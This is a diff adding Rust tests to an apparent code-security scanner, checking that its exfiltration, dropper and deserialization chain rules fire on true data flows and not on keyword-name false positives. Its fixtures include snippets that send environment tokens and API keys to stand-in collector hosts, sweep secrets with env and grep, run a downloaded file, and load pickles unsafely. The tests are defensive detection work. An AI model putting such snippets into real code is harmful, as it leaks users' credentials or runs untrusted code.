@@ -3571,6 +3571,210 @@ mod reconcile {
         );
     }
 
+    // -- names read as values (`name_uses: "value"`) -----------------------
+
+    /// Every built-in chain states how it reads a bound name, and reads it
+    /// as a value: a keyword argument's name or an object key that only
+    /// repeats it is not a use.
+    #[test]
+    fn every_built_in_chain_reads_names_as_values() {
+        use crate::corpus::schema::NameUses;
+        let rules = &crate::corpus::compiled::corpus().correlation_rules;
+        let mut ids: Vec<&str> = rules.iter().map(|r| r.id.as_str()).collect();
+        ids.sort_unstable();
+        assert_eq!(
+            ids,
+            vec![
+                "AGENTSC-CHAIN-001",
+                "AGENTSC-CHAIN-002",
+                "DESER-CHAIN-001",
+                "DROPPER-CHAIN-001",
+                "EXFIL-CHAIN-001",
+                "TLS-CHAIN-001",
+            ],
+            "a chain was added or removed: decide its name_uses and update this list"
+        );
+        for r in rules {
+            assert_eq!(r.name_uses, Some(NameUses::Value), "{}", r.id);
+        }
+    }
+
+    /// The reported false positive: a clean file was CRITICAL RISK because
+    /// `url=` in `requests.get(url=base + "/ping")` repeats the name the
+    /// credential read binds. The call sends `base + "/ping"`.
+    const DB_PING: &str = "import os\n\
+        import requests\n\
+        \n\
+        url = os.environ[\"DATABASE_URL\"]      # CRED-001 binds `url`\n\
+        engine = create_engine(url)\n\
+        \n\
+        \n\
+        def ping(base):\n\
+        \x20   return requests.get(url=base + \"/ping\")   # NET-001; `url=` is a keyword name, not the secret\n";
+
+    #[test]
+    fn exfil_chain_does_not_link_a_keyword_name() {
+        let found = scan("app.py", DB_PING);
+        assert!(found
+            .iter()
+            .any(|f| f.rule == "CRED-001" && f.line == Some(4)));
+        assert!(found
+            .iter()
+            .any(|f| f.rule == "NET-001" && f.line == Some(9)));
+        assert!(chains("app.py", DB_PING).is_empty());
+        // Handing the secret to the request is the chain.
+        let sent = DB_PING.replace("url=base + \"/ping\"", "url=url");
+        assert_eq!(
+            chained("app.py", &sent, "EXFIL-CHAIN-001"),
+            Some(Severity::Critical)
+        );
+        // A key that repeats the name sends its own value.
+        let key = "import os, requests\n\
+            token = os.environ[\"SERVICE_TOKEN\"]\n\
+            client = Client(token)\n\
+            requests.post(u, json={\"token\": \"x\"})\n";
+        assert_eq!(chained("app.py", key, "EXFIL-CHAIN-001"), None);
+        let js = "const token = process.env.SERVICE_TOKEN;\n\
+            const gh = new Octokit({ auth: token });\n\
+            fetch(\"https://api.example.net/login\", { method: \"POST\", body: JSON.stringify({ token: \"anonymous\" }) });\n";
+        assert_eq!(chained("app.js", js, "EXFIL-CHAIN-001"), None);
+    }
+
+    #[test]
+    fn exfil_chain_still_links_the_value_side() {
+        let py = |sink: &str| {
+            format!(
+                "import os, requests\n\
+                 api_key = os.getenv(\"OPENAI_API_KEY\")\n\
+                 token = os.environ[\"SERVICE_TOKEN\"]\n\
+                 {sink}\n"
+            )
+        };
+        for sink in [
+            "requests.post(\"https://collect.example.net/c\", json={\"k\": api_key})",
+            "requests.post(\"https://collect.example.net/c\", data=token)",
+            "requests.get(f\"https://collect.example.net/c?t={token}\")",
+            "requests.post(\"https://collect.example.net/c\", token)",
+            "requests.post(\"https://collect.example.net/c\", token=token)",
+            "requests.get(\"https://collect.example.net/c\", params={\"token\": token})",
+            "requests.post(\n    collect_url,\n    data={\"s\": token},\n)",
+        ] {
+            assert_eq!(
+                chained("app.py", &py(sink), "EXFIL-CHAIN-001"),
+                Some(Severity::Critical),
+                "{sink}"
+            );
+        }
+        for sink in [
+            "fetch(\"https://collect.example.net/c\", { method: \"POST\", body: token });",
+            "axios.post(collectUrl, { token });",
+        ] {
+            let js = format!("const token = process.env.SERVICE_TOKEN;\n{sink}\n");
+            assert_eq!(
+                chained("app.js", &js, "EXFIL-CHAIN-001"),
+                Some(Severity::Critical),
+                "{sink}"
+            );
+        }
+        // An auth header uses the token, and EXFIL-CHAIN-001's
+        // `sink_excludes` keeps it quiet, as it always has: that is where a
+        // key legitimately goes.
+        let header =
+            py("requests.post(\"https://api.example.net/v1\", headers={\"Authorization\": token})");
+        assert_eq!(chained("app.py", &header, "EXFIL-CHAIN-001"), None);
+    }
+
+    #[test]
+    fn agent_chains_do_not_link_a_key_that_repeats_the_name() {
+        // A secret sweep counted locally; the report's `secrets` key carries
+        // the count.
+        let counted = "import subprocess, requests\n\
+            secrets = subprocess.check_output(\"env | grep -E 'TOKEN|SECRET'\", shell=True, text=True)\n\
+            count = len(secrets.splitlines())\n\
+            requests.post(\"https://status.example.dev/report\", json={\"secrets\": count})\n";
+        assert!(fires("audit.py", counted, "AGENTSC-010"));
+        assert_eq!(chained("audit.py", counted, "AGENTSC-CHAIN-001"), None);
+        for sink in [
+            "requests.post(\"https://metrics.example.dev/collect\", data=secrets)",
+            "requests.post(\"https://metrics.example.dev/collect\", headers={\"X-Report\": secrets})",
+        ] {
+            let sent = counted.replace(
+                "requests.post(\"https://status.example.dev/report\", json={\"secrets\": count})",
+                sink,
+            );
+            assert_eq!(
+                chained("audit.py", &sent, "AGENTSC-CHAIN-001"),
+                Some(Severity::Critical),
+                "{sink}"
+            );
+        }
+        let js_key = "const secrets = execSync(\"env | grep -E 'TOKEN|SECRET'\").toString();\n\
+            const n = secrets.split(\"\\n\").length;\n\
+            axios.post(statusUrl, { secrets: n });\n";
+        assert_eq!(chained("audit.js", js_key, "AGENTSC-CHAIN-001"), None);
+        let js_shorthand =
+            "const secrets = execSync(\"env | grep -E 'TOKEN|SECRET'\").toString();\n\
+            axios.post(collectUrl, { secrets });\n";
+        assert_eq!(
+            chained("audit.js", js_shorthand, "AGENTSC-CHAIN-001"),
+            Some(Severity::Critical)
+        );
+        // A project archive built with .env left in: an upload whose form
+        // field is called `archive` sends another file.
+        let other = "import subprocess, requests\n\
+            subprocess.run(f'tar -czf \"{archive}\" --exclude=.git --exclude=node_modules .', shell=True)\n\
+            requests.post(upload_url, files={\"archive\": open(manifest_path, \"rb\")})\n";
+        assert!(fires("deploy.py", other, "AGENTSC-011"));
+        assert_eq!(chained("deploy.py", other, "AGENTSC-CHAIN-002"), None);
+        let uploaded = other.replace(
+            "files={\"archive\": open(manifest_path, \"rb\")}",
+            "files={\"file\": open(archive, \"rb\")}",
+        );
+        assert_eq!(
+            chained("deploy.py", &uploaded, "AGENTSC-CHAIN-002"),
+            Some(Severity::High)
+        );
+    }
+
+    #[test]
+    fn dropper_and_deser_chains_do_not_link_a_keyword_name() {
+        // The downloaded index is written to PATH; the build script that
+        // runs next gets a `PATH` environment key, not the file.
+        let env_key = "import os, sys, subprocess, urllib.request\n\
+            PATH = os.path.join(CACHE_DIR, \"index.json\")\n\
+            with urllib.request.urlopen(INDEX_URL) as response, open(PATH, 'wb') as out_file:\n\
+            \x20   out_file.write(response.read())\n\
+            \n\
+            subprocess.run([sys.executable, build_script], env={\"PATH\": \"/usr/bin:/bin\"})\n";
+        assert!(fires("tool.py", env_key, "CODE-RUNFILE-001"));
+        assert_eq!(chained("tool.py", env_key, "DROPPER-CHAIN-001"), None);
+        let runs_it = env_key.replace("[sys.executable, build_script]", "[sys.executable, PATH]");
+        assert_eq!(
+            chained("tool.py", &runs_it, "DROPPER-CHAIN-001"),
+            Some(Severity::High)
+        );
+        // The package's own labels file is read by `read_labels`; the
+        // unsafe load is the user's checkpoint, and `labels_path=` two lines
+        // on names a parameter.
+        let deser = "import os\n\
+            import torch\n\
+            labels_path = os.path.join(os.path.dirname(__file__), \"labels.pkl\")\n\
+            labels = read_labels(labels_path)\n\
+            ckpt = torch.load(args.checkpoint, map_location=\"cpu\", weights_only=False)\n\
+            model = build_model(ckpt, labels_path=args.labels)\n";
+        assert!(fires("pkg/infer.py", deser, "CODE-MODEL-001"));
+        assert!(fires("pkg/infer.py", deser, "CODE-DESER-001"));
+        assert_eq!(chained("pkg/infer.py", deser, "DESER-CHAIN-001"), None);
+        let bundled = "import os\n\
+            import torch\n\
+            model_path = os.path.join(os.path.dirname(__file__), \"model.pt\")\n\
+            model = torch.load(f=model_path, map_location=\"cpu\", weights_only=False)\n";
+        assert_eq!(
+            chained("pkg/infer.py", bundled, "DESER-CHAIN-001"),
+            Some(Severity::High)
+        );
+    }
+
     #[test]
     fn launch_and_download_observations_stay_low_or_medium() {
         for launch in [
